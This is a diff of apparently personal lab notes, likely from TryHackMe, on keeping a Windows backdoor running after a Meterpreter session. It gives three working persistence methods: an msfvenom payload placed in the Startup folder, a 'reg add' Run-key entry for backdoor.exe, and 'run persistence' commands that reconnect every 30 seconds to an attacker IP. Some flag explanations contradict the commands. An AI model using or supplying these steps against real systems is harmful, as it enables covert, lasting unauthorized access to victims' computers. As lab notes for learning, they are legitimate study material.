@@ -1,17 +1,42 @@
-##After getting the meterpreter connection:
+## After getting the meterpreter connection:
 
-##We can run this command to see how we can hold our persistence with target:
+
+https://null-byte.wonderhowto.com/how-to/hack-like-pro-remotely-install-auto-reconnecting-persistent-back-door-someones-pc-0144576/
+
+
+
+## We have 3 options:
+## 1st:
+## we make a payload on msfvenom and we upload the payload the payload 
+## in the startup files:
+
+C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+
+## 2nd:
+## if the user has the rights to access in regex folder and system,
+## we might run this command in shell (not in meterpreter)
+## but we should first upload the backdoor in the directory: C:\Users\%username%\AppData\Roaming\backdoor.exe
+## After ...
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\tryhackme\AppData\Roaming\backdoor.exe"
+
+
+## 3th:
+## We can run this command to see how we can hold our persistence with target:
 
 meterpreter> run persistence -h
 
 ## I have wroten here a simple persistence code to hold the connection
-## with the client
+## with the client (if you are a simple user check Code 2*
 
-meterpreter> run persistence -A -L c:\\ -X 30 -p 7777 -r 10.10.201.88
+meterpreter> run persistence -A -L c:\\ -X 30 -p 4321 -r 10.10.201.88
+
+## Code 2*:
+meterpreter> run persistence -A -X 30 -p 4321 -r 10.10.201.88
 
 ## This command then will run the persistence script that will start
 ## a matching handler (-A), place the Meterpreter at c:\\ on the target
 ## system (-L c:\\), starts the listener when the system boots (-x), 
 ## checks every 30 seconds for a connection (-i 30), 
-## connects on port 7777 (-p 7777), and connects to the local system (ours) 
+## connects on port 4321 (-p 4321), and connects to the local system (ours) 
 ## on IP address 10.10.201.88 .
